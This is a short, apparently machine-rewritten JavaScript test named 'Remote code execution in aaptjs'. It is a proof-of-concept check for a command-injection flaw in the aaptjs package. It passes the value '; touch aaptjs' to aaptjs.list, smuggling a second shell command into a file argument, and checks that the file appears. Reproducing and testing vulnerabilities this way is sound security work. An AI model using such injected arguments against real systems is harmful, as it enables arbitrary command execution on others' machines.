const v27 = done => {
    const aaptjs = require('aaptjs');
    const fs = require('fs');
    const path = './aaptjs';
    try {
        const v15 = fs.existsSync(path);
        if (v15) {
            const v16 = fs.unlinkSync(path);
            v16;
        }
    } catch (err) {
        const v17 = console.error(err);
        v17;
    }
    file_exist = fs.existsSync(path);
    const v18 = expect(file_exist);
    const v19 = v18.toBe(false);
    v19;
    try {
        const v25 = (err, data) => {
            file_exist = fs.existsSync(path);
            const v20 = expect(file_exist);
            const v21 = v20.toBe(true);
            v21;
            const v23 = function (err) {
                const v22 = done();
                v22;
            };
            const v24 = fs.unlink(path, v23);
            v24;
        };
        const v26 = aaptjs.list('; touch aaptjs', v25);
        v26;
    } catch (error) {
    }
};
const v28 = test('Remote code execution in aaptjs', v27);
v28;